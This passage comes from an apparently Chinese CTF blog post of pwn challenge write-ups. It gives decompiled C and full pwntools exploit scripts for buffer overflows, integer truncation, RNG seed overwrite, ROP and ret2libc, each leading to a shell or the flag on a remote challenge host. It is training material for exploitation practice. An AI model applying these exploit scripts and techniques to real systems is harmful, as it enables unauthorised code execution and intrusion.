class="hljs-number">0LL</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"-------------------------------"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"-------------------------------"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your name:"</span>);</span><br><span class="line">  <span class="hljs-built_in">gets</span>(&amp;v9);</span><br><span class="line">  v4 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)seed[<span class="hljs-number">0</span>];</span><br><span class="line">  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v8 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"-------------Turn:%d-------------\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"---------------------------------"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v6 != v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"GG!"</span>);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    v4 = <span class="hljs-string">"Success!"</span>;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">sub_C3E</span>(v4);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里首先看到是猜随机生成的数，然后如果所有的数都猜对了，就调用最后一个函数输出flag，首先的想法就是要替换掉seed，变成我们已知的数字，就可以调用相同版本的libc里的随机数生成函数，来生成同样的数，exp如下:</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment"># io = process('./guess_num')</span></span><br><span class="line">io = remote(<span class="hljs-string">'111.198.29.45'</span>, <span class="hljs-number">46930</span>)</span><br><span class="line"><span class="hljs-comment"># elf=ELF('./guess_num')</span></span><br><span class="line"><span class="hljs-comment"># libc=elf.libc</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'Your name:'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(<span class="hljs-number">0</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):</span><br><span class="line">    num = <span class="hljs-built_in">str</span>(libc.rand() % <span class="hljs-number">6</span>+<span class="hljs-number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="hljs-string">'number:'</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h4><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"---------------------"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       1.Login       "</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"---------------------"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">login</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye~"</span>);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>肯定选择1，进入<code>login()</code>函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">login</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please input your username:"</span>);</span><br><span class="line">  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x19</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please input your passwd:"</span>);</span><br><span class="line">  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x199</span>u);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">check_passwd</span>(&amp;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> *__cdecl <span class="hljs-title">check_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="hljs-built_in">strlen</span>(s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success"</span>);</span><br><span class="line">    <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">    result = <span class="hljs-built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后发现了一个奇怪的函数，可以利用</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">what_is_this</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"cat flag"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>按理说我们只需要覆盖掉<code>check_passwd()</code>的返回值，然后伪造system栈帧就可以了，但是这里限制了我们输入的长度，但是观察汇编之后发现这个变量值是从<code>al</code>寄存器<code>mov</code>过来的，只能存储0-255的数字，因此我们可以输入259-263之间的字符数，就可以实现我们的目标，exp如下:</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="hljs-string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=elf.symbols[<span class="hljs-string">'what_is_this'</span>]</span><br><span class="line"><span class="hljs-comment"># print hex(sys_addr)</span></span><br><span class="line"><span class="hljs-comment"># io=process('./int_overflow')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">41386</span>)</span><br><span class="line">io.sendlineafter(<span class="hljs-string">'Your choice:'</span>,<span class="hljs-string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="hljs-string">'Please input your username:'</span>,<span class="hljs-string">'rycbar'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="hljs-string">'Please input your passwd:'</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">4</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="hljs-number">263</span>,<span class="hljs-string">'a'</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h4><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">hello</span>();</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"thank you"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">hello</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> *v0; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = <span class="hljs-number">30</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;s &amp; <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    *(_WORD *)&amp;s = <span class="hljs-number">0</span>;</span><br><span class="line">    v0 = (<span class="hljs-keyword">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="hljs-number">28</span>;</span><br><span class="line">  }</span><br><span class="line">  v2 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="hljs-number">0</span>;</span><br><span class="line">    v2 += <span class="hljs-number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v2 &lt; (v1 &amp; <span class="hljs-number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v1 &amp; <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    *(_WORD *)v3 = <span class="hljs-number">0</span>;</span><br><span class="line">    v3 += <span class="hljs-number">2</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v1 &amp; <span class="hljs-number">1</span> )</span><br><span class="line">    *v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"please tell me your name"</span>);</span><br><span class="line">  <span class="hljs-built_in">fgets</span>(name, <span class="hljs-number">50</span>, stdin);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">gets</span>(&amp;s);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwn</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"echo hehehe"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所有需要用到的函数都在这里，可以看到自带system函数，但是没有<code>/bin/sh</code>，所以需要手动构造，正好之前输入了一个<code>name</code>是一个全局变量，可以直接找到地址，以此构造ROP，exp如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">sh_addr=<span class="hljs-number">0x0804A080</span></span><br><span class="line">elf=ELF(<span class="hljs-string">'./cgpwn2'</span>)</span><br><span class="line">sys_addr=elf.symbols[<span class="hljs-string">'system'</span>]</span><br><span class="line">io=process(<span class="hljs-string">'./cgpwn2'</span>)</span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">52898</span>)</span><br><span class="line">io.sendlineafter(<span class="hljs-string">'please tell me your name'</span>,<span class="hljs-string">'/bin/sh'</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'hello,you can leave some message here:'</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x26</span>+p32(<span class="hljs-number">0</span>)+p32(sys_addr)+p32(<span class="hljs-number">0</span>)+p32(sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h4><p>简单的栈溢出，经典题目，有膜法</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># io=process('./when_did_you_born')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">47087</span>)</span><br><span class="line">io.sendlineafter(<span class="hljs-string">'What\'s Your Birth?'</span>,<span class="hljs-string">'1000'</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">"What's Your Name?"</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">1926</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>比上一题更简单的溢出（半斤八两）</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment"># io=process('./hello_pwn')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">42456</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'bof'</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">4</span>+p64(<span class="hljs-number">1853186401</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># io=process('./level3')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">41019</span>)</span><br><span class="line">elf=ELF(<span class="hljs-string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="hljs-string">'write'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="hljs-string">'vulnerable_function'</span>]</span><br><span class="line">write_got=elf.got[<span class="hljs-string">'write'</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0</span>)+p32(write_plt)+p32(vuln_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'Input:\n'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_leak=u32(io.recv()[:<span class="hljs-number">4</span>])</span><br><span class="line">libc=LibcSearcher(<span class="hljs-string">'write'</span>,write_leak)</span><br><span class="line">libc_base = write_leak - libc.dump(<span class="hljs-string">'write'</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="hljs-string">'system'</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="hljs-string">'str_bin_sh'</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0</span>)+p32(sys_addr)+p32(<span class="hljs-number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p><h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">sys_addr=<span class="hljs-number">0x400596</span></span><br><span class="line">pop_ret_addr=<span class="hljs-number">0x400663</span></span><br><span class="line">main_addr=<span class="hljs-number">0x4005c6</span> </span><br><span class="line"><span class="hljs-comment"># io=process('./level0/level0')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">47038</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(sys_addr)</span><br><span class="line"><span class="hljs-comment"># print payload</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h4><p>格式化字符串漏洞的利用</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> buf; <span class="hljs-comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="hljs-comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);</span><br><span class="line">  buf = <span 